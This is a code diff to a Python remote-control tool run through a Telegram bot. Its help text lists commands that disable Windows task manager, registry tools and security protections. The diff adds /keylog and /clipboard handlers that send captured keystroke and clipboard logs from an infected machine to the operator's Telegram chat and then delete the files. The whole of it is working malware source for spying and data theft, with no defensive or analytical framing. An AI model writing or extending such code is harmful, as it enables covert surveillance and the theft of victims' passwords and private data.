@@ -222,7 +222,9 @@ def send_help(message):
         "/dtaskmgr - Disables task manager\n"
         "/drun - Disables run command\n"
         "/dregistry - Disables registry tools\n"
-        "/dwinsec - Disables Windows security protections"
+        "/dwinsec - Disables Windows security protections\n"
+        "/keylog - Sends and deletes keylog files\n"
+        "/clipboard - Sends and deletes clipboard files"
     )
     bot.send_message(message.chat.id, help_message)
 
@@ -1035,23 +1037,54 @@ def handle_disable_windows_security(message):
             os.remove(error_log_path)
 
 # Send keylogs to Telegram Bot
-@bot.message_handler(commands=['dkeylog'])
-def dkeylog(message):
+@bot.message_handler(commands=['keylog'])
+def keylog(message):
     folder_path, log_files = get_app_dir()
 
     if folder_path is None or not log_files:
         bot.send_message(message.chat.id, "No log files found on any drive.")
         return
 
+    keylog_found = False
     for log_file in log_files:
         file_path = os.path.join(folder_path, log_file)
 
-        with open(file_path, 'rb') as file:
-            bot.send_document(message.chat.id, file, caption=log_file)
+        if "keylog" in log_file and log_file.endswith('.txt'):
+            keylog_found = True
+            with open(file_path, 'rb') as file:
+                bot.send_document(message.chat.id, file, caption=log_file)
 
-        os.remove(file_path)
+            os.remove(file_path)
 
-    bot.send_message(message.chat.id, "Log files sent and deleted from drive: " + folder_path)
+    if keylog_found:
+        bot.send_message(message.chat.id, "Keylog file sent and deleted from drive: " + folder_path)
+    else:
+        bot.send_message(message.chat.id, "No keylog file found.")
+
+# Send clipboard logs to Telegram Bot
+@bot.message_handler(commands=['clipboard'])
+def dclipboard(message):
+    folder_path, log_files = get_app_dir()
+
+    if folder_path is None or not log_files:
+        bot.send_message(message.chat.id, "No log files found on any drive.")
+        return
+
+    clipboard_found = False
+    for log_file in log_files:
+        file_path = os.path.join(folder_path, log_file)
+
+        if "clipboard" in log_file and log_file.endswith('.txt'):
+            clipboard_found = True
+            with open(file_path, 'rb') as file:
+                bot.send_document(message.chat.id, file, caption=log_file)
+
+            os.remove(file_path)
+
+    if clipboard_found:
+        bot.send_message(message.chat.id, "Clipboard file sent and deleted from drive: " + folder_path)
+    else:
+        bot.send_message(message.chat.id, "No clipboard file found.")
 
 # Continuation of Keylogger Functions
 # Get path to Driver directory
